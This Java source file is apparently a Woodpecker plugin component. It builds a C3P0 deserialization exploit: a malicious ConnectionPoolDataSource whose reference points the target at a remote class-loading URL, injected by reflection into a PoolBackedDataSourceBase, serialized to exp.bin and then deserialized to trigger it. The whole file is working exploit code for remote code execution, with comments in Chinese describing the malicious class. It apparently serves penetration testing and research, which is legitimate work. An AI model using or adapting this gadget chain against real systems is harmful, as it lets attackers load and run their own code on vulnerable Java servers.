package me.gv7.woodpecker.plugin;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;
import com.mchange.v2.naming.ReferenceableUtils;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0_URLClassLoader {
//    ConnectionPoolDataSource
    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{
        @Override
        public Reference getReference() throws NamingException {
            return new Reference("Bcel","bcel","http://127.0.0.1:8765/");
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    //序列化
    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {
        //反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,c);

        //序列化流写入文件
        FileOutputStream fos = new FileOutputStream(new File("exp.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(poolBackedDataSourceBase);
    }

    //反序列化
    public static void Pool_Deserial() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("exp.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        EXP_Loader exp_loader = new EXP_Loader();
        Pool_Serial(exp_loader);
        Pool_Deserial();
    }

}